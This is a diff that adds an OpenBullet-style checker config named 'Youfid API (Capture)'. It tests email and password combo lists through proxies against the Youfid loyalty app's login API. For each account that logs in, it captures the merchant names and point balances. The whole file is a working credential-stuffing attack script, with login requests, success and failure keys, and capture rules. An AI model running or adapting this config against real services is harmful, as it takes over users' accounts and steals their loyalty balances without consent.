@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Youfid API ( Capture )",
+  "SuggestedBots": 5,
+  "LastModified": "2018-07-03T18:34:13.0740571+02:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "http://api.youfid.fr/dev/service/login.php" AutoRedirect=FALSE 
+  CONTENT "{ \"source\":\"youfid\", \"email\":\"<USER>\", \"password\":\"<PASS>\" }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTURE_USR_ID PARSE "<SOURCE>" LR "usr_id\":\"" "\"" Recursive=FALSE -> VAR "usr_id" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Error: bad user combinaison" 
+  KEYCHAIN Success OR 
+    KEY "\",\"status\":\"ok\"" 
+#GET_POINTS REQUEST POST "http://api.youfid.fr/dev/service/getMerchants.php " AutoRedirect=TRUE 
+  CONTENT "{ \"usr_id\":\"<usr_id>\", \"is_having_points\":\"1\", \"nb_merchants\": \"20\", \"offset\":\"0\" }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CAPTURE_NOMS_RESTO PARSE "<SOURCE>" LR "merchant_name\":\"" "\"" Recursive=TRUE -> CAP "Points" "" "" 
+#CAPTURE_POINTS PARSE "<SOURCE>" LR "nb_pts\":" "}" Recursive=TRUE -> CAP "Points" "" "" 
